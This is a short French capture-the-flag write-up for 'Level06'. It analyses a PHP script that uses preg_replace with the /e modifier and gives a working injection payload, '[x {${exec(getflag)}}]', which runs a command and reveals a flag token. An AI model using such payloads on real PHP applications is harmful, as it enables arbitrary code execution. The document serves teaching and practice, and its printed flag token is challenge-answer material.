# Level06

On observe deux fichiers a la racine: un exécutable <code>level06</code> et un fichier PHP <code>level06.php</code>

```bash
$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

$ ./level06 level06.php
...
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\ x /", " x ", $m); $m = preg_replace("/ y/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\(x ( x *)\))/e", "y(\"\\2\")", $a); $a = preg_replace("/\(/", "(", $a); $a = preg_replace("/\)/", ")", $a); return $a; }
$r = x($argv(1), $argv(2)); print $r;
?>
...
```

```bash
$ cat level06.php
#!/usr/bin/php
<?php
function y($m) {
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}

function x($y, $z) {
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
?>
```

En ouvrant le fichier PHP, on observe beaucoup de <code>preg_replace</code> et particulierement:

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

qui utilise le modifier <code>/e</code> qui permet de lancer des fonctions depuis le preg_replace

On peut donc commencer l'injection

```bash
$ echo '[x {${exec(getflag)}}]' > /tmp/inject

$ ./level06 /tmp/inject
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1

```

`https://www.hashbangcode.com/article/using-e-modifier-php-pregreplace`
